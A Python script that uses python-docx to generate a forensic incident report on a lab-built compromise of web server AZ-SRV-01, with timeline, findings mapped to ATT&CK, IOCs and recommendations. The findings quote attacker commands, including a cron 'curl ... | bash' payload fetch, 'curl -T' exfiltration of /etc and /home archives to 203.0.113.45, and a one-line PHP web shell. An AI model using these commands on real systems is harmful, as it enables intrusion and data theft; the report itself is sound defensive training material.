# -*- coding: utf-8 -*-
"""Build docs/incident_report.docx from the case data."""
from docx import Document
from docx.shared import Pt, Cm, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn
from docx.oxml import OxmlElement

doc = Document()
s = doc.sections[0]
s.top_margin = Cm(2); s.bottom_margin = Cm(2)
s.left_margin = Cm(2.2); s.right_margin = Cm(2.2)

st = doc.styles['Normal']; st.font.name = 'Calibri'; st.font.size = Pt(10.5)

def P(t, size=10.5, bold=False, after=6, before=0, color=None, italic=False, align=WD_ALIGN_PARAGRAPH.JUSTIFY):
    p = doc.add_paragraph(); p.alignment = align
    p.paragraph_format.space_after = Pt(after); p.paragraph_format.space_before = Pt(before)
    p.paragraph_format.line_spacing = 1.15
    r = p.add_run(t); r.bold = bold; r.italic = italic; r.font.size = Pt(size)
    if color: r.font.color.rgb = color
    return p

def H(t, size=14):
    p = P(t, size=size, bold=True, after=6, before=12, color=RGBColor(0x0B, 0x3D, 0x6B), align=WD_ALIGN_PARAGRAPH.LEFT)
    return p

def B(t):
    p = doc.add_paragraph(t, style='List Bullet')
    p.paragraph_format.space_after = Pt(3)
    for r in p.runs: r.font.size = Pt(10.5)
    return p

def table(rows, widths=None, header=True):
    t = doc.add_table(rows=len(rows), cols=len(rows[0]))
    t.style = 'Light Grid Accent 1'
    t.alignment = WD_TABLE_ALIGNMENT.CENTER
    for i, row in enumerate(rows):
        for j, val in enumerate(row):
            cell = t.cell(i, j)
            cell.text = ""
            para = cell.paragraphs[0]
            r = para.add_run(str(val)); r.font.size = Pt(9)
            if header and i == 0: r.bold = True
    if widths:
        for j, w in enumerate(widths):
            for row in t.rows:
                row.cells[j].width = Cm(w)
    doc.add_paragraph().paragraph_format.space_after = Pt(2)
    return t

# ---------- title ----------
P("INCIDENT REPORT", 22, True, after=2, align=WD_ALIGN_PARAGRAPH.LEFT)
P("Compromise of Web Server AZ-SRV-01", 15, False, after=2, align=WD_ALIGN_PARAGRAPH.LEFT)
P("Case no. DF-2026-0211  ·  Classification: Internal  ·  Report date: 18 November 2026", 9.5, after=16,
  color=RGBColor(0x55, 0x55, 0x55))

table([
    ["Field", "Detail"],
    ["Examiner", "Azzam Abdulkarim Alharbi"],
    ["Affected host", "AZ-SRV-01 — Ubuntu 22.04 LTS web server"],
    ["Evidence item", "128 MB ext4 disk image (bit-for-bit copy)"],
    ["Verification hashes", "MD5 ab915de4cb82737611db791c5f71fd4e\nSHA-256 b52fa66c597f431a96c2819ca1885e696c51ce05a9486c73df6d4483e2a27b68"],
    ["Incident window", "10–11 February 2026 (UTC)"],
    ["Severity", "Critical — confirmed unauthorised access, root compromise, attempted data exfiltration"],
], widths=[4, 12])

# ---------- 1 ----------
H("1. Executive summary")
P("On 11 February 2026 the web server AZ-SRV-01 was accessed without authorisation through a PHP web shell "
  "uploaded to a writable directory under the web root. The attacker obtained an interactive shell as the "
  "service account, added an SSH key for persistent access, escalated to root through a permissive sudoers "
  "entry, created a rogue local account, installed cron-based persistence, and staged and attempted to "
  "transfer data to an external host. All stages were reconstructed from the disk image alone; the evidence "
  "correlates across web logs, authentication logs, shell history and filesystem metadata.")

# ---------- 2 ----------
H("2. Scope and limitations")
P("The examination covers a single evidence item: a 128 MB ext4 image of the server's system volume. "
  "No memory capture, network capture or volatile data was available, so process-level and in-memory "
  "artifacts could not be examined. The image is a lab-generated scenario built for training and "
  "reproducibility (lab/build_evidence.py); the analysis, hashes, inode references and timestamps in this "
  "report are genuine tool output obtained from that image.")
P("Tools: The Sleuth Kit 4.12 (fsstat, fls, icat, mactime), SHA-256 hashing, manual log correlation. "
  "The image was never mounted; all recovery was performed read-only by inode.")

# ---------- 3 ----------
H("3. Timeline of events (UTC)")
table([
    ["Time", "Event", "Evidence"],
    ["11 Feb 02:13:58", "Directory enumeration of /uploads/", "access.log"],
    ["02:14:37", "Web shell .cache.php written", "inode 45 (mtime)"],
    ["02:14:41", "First command execution through the shell", "access.log POST"],
    ["02:22:11", "SSH login as 'deploy' from 203.0.113.45", "auth.log"],
    ["02:24:05", "Attacker ssh-ed25519 key added", "inode 21 (mtime)"],
    ["02:31:44", "Privileged shell via sudo", "auth.log"],
    ["02:31:50", "sudoers entry granting NOPASSWD:ALL", "inode 16 (mtime)"],
    ["02:33:02", "Account 'svc-update' (UID 1002) created", "/etc/passwd, auth.log"],
    ["02:36:20", "Cron persistence installed for www-data", "inode 40 (mtime)"],
    ["02:43:30", "Data staged in /tmp/.staging", "archive mtime"],
    ["02:44:09", "Archive uploaded and removed", ".bash_history"],
], widths=[3.4, 8.4, 4.6])

# ---------- 4 ----------
H("4. Findings")
findings = [
 ("F1 — Web shell upload (Critical)",
  "A 74-byte PHP file /var/www/html/uploads/.cache.php (inode 45) executes arbitrary commands via "
  "system($_POST['c']). Written at 02:14:37 and first invoked four seconds later. The uploads directory "
  "was both writable and PHP-executable.",
  "ATT&CK T1505.003 · CWE-434"),
 ("F2 — Unauthorised SSH key (High)",
  "/home/deploy/.ssh/authorized_keys (inode 21) contains an ssh-ed25519 key added at 02:24:05. auth.log "
  "records a successful publickey session for 'deploy' from 203.0.113.45 at 02:22:11.",
  "ATT&CK T1098.004"),
 ("F3 — Privilege escalation to root (High)",
  "sudo was invoked at 02:31:44; /etc/sudoers.d/deploy (inode 16) grants NOPASSWD:ALL and was created "
  "fourteen seconds later. No password was required.",
  "ATT&CK T1548.003 · CWE-269"),
 ("F4 — Rogue local account (High)",
  "/etc/passwd lists UID 1002 'svc-update' created at 02:33:02; shell history shows the password set with "
  "chpasswd, leaving it recoverable in .bash_history.",
  "ATT&CK T1136.001"),
 ("F5 — Cron persistence (Medium)",
  "/var/spool/cron/crontabs/www-data (inode 40) runs 'curl -s http://203.0.113.45/b | bash' every seven "
  "minutes, re-establishing access after reboot or cleanup.",
  "ATT&CK T1053.003"),
 ("F6 — Data staging and attempted exfiltration (High)",
  "/tmp/.staging holds a staging note (02:43:57); history records tar archives of /etc, /home and "
  "/var/www uploaded with curl -T to http://203.0.113.45/u and then deleted.",
  "ATT&CK T1560.001 · T1048"),
 ("F7 — Clear-text credential handling (Medium)",
  "The account password was set inline and persists in .bash_history (inode 19), readable by anyone with "
  "access to the home directory.",
  "ATT&CK T1552.003"),
]
for title, body, attack in findings:
    P(title, 11.5, True, after=2, before=6)
    P(body, 10.5, after=2)
    P(attack, 9.5, italic=True, after=4, color=RGBColor(0x44, 0x44, 0x44))

# ---------- 5 ----------
H("5. Indicators of compromise")
table([
    ["Type", "Value", "Context"],
    ["IPv4", "203.0.113.45", "Scanning, shell traffic, SSH source, exfiltration target"],
    ["File", "/var/www/html/uploads/.cache.php", "Web shell (inode 45)"],
    ["URL", "http://203.0.113.45/b", "Payload piped to bash by cron"],
    ["URL", "http://203.0.113.45/u", "Upload endpoint for exfiltration"],
    ["File", "/var/spool/cron/crontabs/www-data", "Persistence (inode 40)"],
    ["File", "/etc/sudoers.d/deploy", "NOPASSWD privilege escalation (inode 16)"],
    ["Account", "svc-update (UID 1002)", "Rogue local account"],
], widths=[2.6, 6.6, 7.2])

# ---------- 6 ----------
H("6. Recommendations")
for r in [
 "Disable PHP execution in upload directories and store user files outside the web root.",
 "Alert on writes to authorized_keys, crontabs, /etc/passwd and sudoers (auditd + SIEM).",
 "Remove NOPASSWD sudo entries; require MFA and per-command authorisation for privilege use.",
 "Centralise authentication, web and cron logs; retain 90 days minimum.",
 "Rotate all credentials associated with the host; treat the deploy key and svc-update password as compromised.",
 "Restrict server egress and alert on large outbound transfers and curl -T usage.",
 "Add memory acquisition to the response playbook — process and network evidence was unavailable here.",
]:
    B(r)

H("7. Evidence integrity")
P("The image hash is recorded before analysis (hashes.txt). Every recovered artifact is hashed in "
  "evidence/HASHES.txt, and inode numbers are cited so any finding can be reproduced with: "
  "icat -f ext4 AZ-SRV-01.img <inode>. The generator script commits the full scenario, allowing a third "
  "party to rebuild a byte-identical image and repeat the examination.")

path = '/root/dfir-lab/docs/incident_report.docx'
import os
os.makedirs('/root/dfir-lab/docs', exist_ok=True)
doc.save(path)
print(path)
